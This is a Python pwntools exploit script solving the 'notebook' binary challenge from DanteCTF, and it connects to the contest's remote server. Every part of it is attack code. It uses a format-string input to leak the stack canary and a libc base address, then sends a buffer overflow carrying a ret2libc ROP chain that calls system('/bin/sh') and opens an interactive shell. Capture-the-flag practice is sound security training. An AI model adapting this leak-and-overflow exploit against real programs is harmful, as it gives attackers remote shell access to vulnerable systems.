from pwn import *
from time import *
#p = process("./notebook_patched")
p = remote("challs.dantectf.it", 31530)
elf = ELF("./notebook_patched", checksec = 0)
libc = elf.libc

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"]: ", b"1")
p.sendlineafter(b"name: ", b"retr0")
p.sendlineafter(b"]: ", b"1")
p.sendlineafter(b"Y]: ", b"%9$p.%15$p.")

p.sendlineafter(b"> " ,b"4")
p.sendlineafter(b"]: ", b"1")
p.recvuntil(b"Meeting date: ")
canary = int(p.recv(18), 16)
print(hex(canary))
p.recv(1)
libc.address = int(p.recv(14), 16) - 0x29d90
print(hex(libc.address))

rdi = p64(libc.address + 0x000000000002a3e5)
ret = p64(libc.address + 0x0000000000029cd6)
system = p64(libc.sym.system)
binsh = p64(next(libc.search(b"/bin/sh\x00")))
canary = p64(canary)
payload = flat(
        cyclic(28),
        canary,
        b"\x00" * 8,
        rdi,
        binsh,
        ret,
        system
        )
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"]: ", b"3")
p.sendlineafter(b"name: ", b"retr0")
p.sendlineafter(b"]: ", b"1")
p.sendlineafter(b"Y]: ", b"A" * 11 + b"\x00" + payload)
p.interactive()
